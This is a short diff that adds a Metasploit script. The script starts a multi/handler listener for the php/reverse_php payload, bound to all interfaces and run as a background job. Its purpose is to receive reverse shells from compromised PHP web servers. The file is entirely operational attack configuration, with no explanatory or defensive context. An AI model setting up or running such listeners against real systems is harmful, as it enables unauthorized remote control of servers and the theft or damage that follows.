@@ -1,0 +1,5 @@
+use exploit/multi/handler 
+set payload php/reverse_php
+show options
+set lhost 0.0.0.0
+run -j
